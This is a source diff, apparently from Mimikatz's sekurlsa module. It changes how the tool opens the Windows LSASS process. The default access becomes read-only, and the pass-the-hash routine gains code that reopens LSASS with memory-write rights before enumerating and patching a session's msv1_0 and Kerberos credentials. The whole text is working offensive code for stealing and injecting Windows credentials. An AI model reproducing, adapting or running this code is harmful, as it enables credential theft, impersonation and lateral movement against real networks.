@@ -147,7 +147,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	HANDLE hData = NULL;
 	DWORD pid;
 	PMINIDUMP_SYSTEM_INFO pInfos;
-	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
+	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
 	BOOL isError = FALSE;
 
 	if(!cLsass.hLsassMem)
@@ -959,13 +959,54 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 
 VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data)
 {
-	kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", data->LogonId->HighPart, data->LogonId->LowPart, data->LogonId->HighPart, data->LogonId->LowPart);
-	kprintf(L"  \\_ msv1_0   - ");
-	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, data);
-	kprintf(L"\n");
-	kprintf(L"  \\_ kerberos - ");
-	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, data);
-	kprintf(L"\n");
+	OBJECT_BASIC_INFORMATION bi;
+	ULONG szNeeded;
+	HANDLE hTemp;
+	NTSTATUS status;
+	BOOL isRWok = FALSE;
+
+	if(NT_SUCCESS(kuhl_m_sekurlsa_acquireLSA()) && (cLsass.hLsassMem->type == KULL_M_MEMORY_TYPE_PROCESS))
+	{
+		kprintf(L"  |  LSA Process ");
+		status = NtQueryObject(cLsass.hLsassMem->pHandleProcess->hProcess, ObjectBasicInformation, &bi, sizeof(OBJECT_BASIC_INFORMATION), &szNeeded);
+		if(NT_SUCCESS(status))
+		{
+			if(isRWok = (bi.GrantedAccess & (PROCESS_VM_OPERATION | PROCESS_VM_WRITE)))
+				kprintf(L"was already R/W\n");
+			else
+			{
+				if(hTemp = OpenProcess(bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, GetProcessId(cLsass.hLsassMem->pHandleProcess->hProcess)))
+				{
+					isRWok = TRUE;
+					CloseHandle(cLsass.hLsassMem->pHandleProcess->hProcess);
+					cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
+					kprintf(L"is now R/W\n");
+				}
+				else PRINT_ERROR_AUTO(L"OpenProcess");
+
+				//if(isRWok = DuplicateHandle(GetCurrentProcess(), cLsass.hLsassMem->pHandleProcess->hProcess, GetCurrentProcess(), &hTemp, bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, 0)) // FAIL :(
+				//{
+				//	CloseHandle(cLsass.hLsassMem->pHandleProcess->hProcess);
+				//	cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
+				//	kprintf(L"is now R/W\n");
+				//}
+				//else PRINT_ERROR_AUTO(L"DuplicateHandle");
+			}
+		}
+		else PRINT_ERROR(L"NtQueryObject: %08x\n", status);
+
+		if(isRWok)
+		{
+			kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", data->LogonId->HighPart, data->LogonId->LowPart, data->LogonId->HighPart, data->LogonId->LowPart);
+			kprintf(L"  \\_ msv1_0   - ");
+			kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, data);
+			kprintf(L"\n");
+			kprintf(L"  \\_ kerberos - ");
+			kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, data);
+			kprintf(L"\n");
+		}
+	}
+	else PRINT_ERROR(L"memory handle is not KULL_M_MEMORY_TYPE_PROCESS\n"); 
 }
 
 VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
